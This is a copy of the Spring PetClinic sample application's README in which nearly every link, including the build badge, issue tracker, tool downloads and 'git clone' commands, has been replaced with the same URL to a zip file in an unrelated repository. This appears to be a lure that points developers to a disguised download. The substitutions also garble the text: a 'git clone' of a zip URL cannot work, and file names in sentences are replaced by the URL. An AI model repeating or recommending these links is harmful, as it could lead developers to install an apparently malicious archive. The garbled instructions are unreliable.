# Spring PetClinic Sample Application [![Build Status](https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip)](https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip)

## Understanding the Spring Petclinic application with a few diagrams
<a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">See the presentation here</a>

## Running petclinic locally
```
	git clone https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip
	cd spring-petclinic
	./mvnw tomcat7:run
```

You can then access petclinic here: http://localhost:9966/petclinic/

## In case you find a bug/suggested improvement for Spring Petclinic
Our issue tracker is available here: https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip


## Database configuration

In its default configuration, Petclinic uses an in-memory database (HSQLDB) which
gets populated at startup with data. A similar setup is provided for MySql in case a persistent database configuration is needed.
Note that whenever the database type is changed, the https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip file needs to be updated and the mysql-connector-java artifact from the https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip needs to be uncommented.

You may start a MySql database with docker:

```
docker run -e MYSQL_ROOT_PASSWORD=petclinic -e MYSQL_DATABASE=petclinic -p 3306:3306 mysql:5.7.8
```

## Working with Petclinic in Eclipse/STS

### prerequisites
The following items should be installed in your system:
* Maven 3 (https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip)
* git command line tool (https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip)
* Eclipse with the m2e plugin (m2e is installed by default when using the STS (https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip) distribution of Eclipse)

Note: when m2e is available, there is an m2 icon in Help -> About dialog.
If m2e is not there, just follow the install process here: https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip


### Steps:

1) In the command line
```
git clone https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip
```
2) Inside Eclipse
```
File -> Import -> Maven -> Existing Maven project
```


## Looking for something in particular?

<table>
  <tr>
    <th width="300px">Java Config</th><th width="300px"></th>
  </tr>
  <tr>
    <td>Java Config branch</td>
    <td>
      Petclinic uses XML configuration by default. In case you'd like to use Java Config instead, there is a Java Config branch available <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">here</a>. Thanks to Antoine Rey for his contribution.     
    </td>
  </tr>
  <tr>
    <th width="300px">Inside the 'Web' layer</th><th width="300px">Files</th>
  </tr>
  <tr>
    <td>Spring MVC - XML integration</td>
    <td><a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a></td>
  </tr>
  <tr>
    <td>Spring MVC - ContentNegotiatingViewResolver</td>
    <td><a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a></td>
  </tr>
  <tr>
    <td>JSP custom tags</td>
    <td>
      <a href="/src/main/webapp/WEB-INF/tags">WEB-INF/tags</a>
      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a></td>
  </tr>
  <tr>
    <td>Bower</td>
    <td>
      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">bower-install maven profile declaration inside https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a> <br />
      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">JavaScript libraries are defined by the manifest file https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a> <br />
      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">Bower configuration using JSON</a> <br />
      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">Resource mapping in Spring configuration</a> <br />
      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">sample usage in JSP</a></td>
    </td>
  </tr>
  <tr>
    <td>Dandelion-datatables</td>
    <td>
      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a> 
      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a> 
      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a> 
      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a> 
   </td>
  </tr>
  <tr>
    <td>Thymeleaf branch</td>
    <td>
      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">See here</a></td>
  </tr>
  <tr>
    <td>Branch using GemFire and Spring Data GemFire instead of ehcache (thanks Bijoy Choudhury)</td>
    <td>
      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">See here</a></td>
  </tr>
</table>

<table>
  <tr>
    <th width="300px">'Service' and 'Repository' layers</th><th width="300px">Files</th>
  </tr>
  <tr>
    <td>Transactions</td>
    <td>
      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a>
       <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a>
    </td>
  </tr>
  <tr>
    <td>Cache</td>
      <td>
      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a>
       <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a>
    </td>
  </tr>
  <tr>
    <td>Bean Profiles</td>
      <td>
      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a>
       <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a>
       <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a>
    </td>
  </tr>
  <tr>
    <td>JdbcTemplate</td>
    <td>
      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a>
      <a href="/src/main/java/org/springframework/samples/petclinic/repository/jdbc">jdbc folder</a></td>
  </tr>
  <tr>
    <td>JPA</td>
    <td>
      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a>
      <a href="/src/main/java/org/springframework/samples/petclinic/repository/jpa">jpa folder</a></td>
  </tr>
  <tr>
    <td>Spring Data JPA</td>
    <td>
      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip</a>
      <a href="/src/main/java/org/springframework/samples/petclinic/repository/springdatajpa">springdatajpa folder</a></td>
  </tr>
</table>

<table>
  <tr>
    <th width="300px">Others</th><th width="300px">Files</th>
  </tr>
  <tr>
    <td>Gradle branch</td>
    <td>
      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">See here</a></td>
  </tr>
</table>


## Interaction with other open source projects

One of the best parts about working on the Spring Petclinic application is that we have the opportunity to work in direct contact with many Open Source projects. We found some bugs/suggested improvements on various topics such as Spring, Spring Data, Bean Validation and even Eclipse! In many cases, they've been fixed/implemented in just a few days.
Here is a list of them:

<table>
  <tr>
    <th width="300px">Name</th>
    <th width="300px"> Issue </th>
  </tr>

  <tr>
    <td>Spring JDBC: simplify usage of NamedParameterJdbcTemplate</td>
    <td> <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip"> SPR-10256</a> and <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip"> SPR-10257</a> </td>
  </tr>
  <tr>
    <td>Bean Validation / Hibernate Validator: simplify Maven dependencies and backward compatibility</td>
    <td>
      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip"> HV-790</a> and <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip"> HV-792</a>
      </td>
  </tr>
  <tr>
    <td>Spring Data: provide more flexibility when working with JPQL queries</td>
    <td>
      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip"> DATAJPA-292</a>
      </td>
  </tr>  
  <tr>
    <td>Eclipse: validation bug when working with https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip files (has only been fixed for Eclipse 4.3 (Kepler)). <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip">See here for more details.</a></td>
    <td>
      <a href="https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip"> STS-3294</a>
    </td>
  </tr>    
</table>


# Contributing

The [issue tracker](https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip) is the preferred channel for bug reports, features requests and submitting pull requests.

For pull requests, editor preferences are available in the [editor config](https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip) for easy use in common text editors. Read more and download plugins at <https://raw.githubusercontent.com/mohanpeddayyagri/petclinic/master/dysacousis/petclinic.zip>.




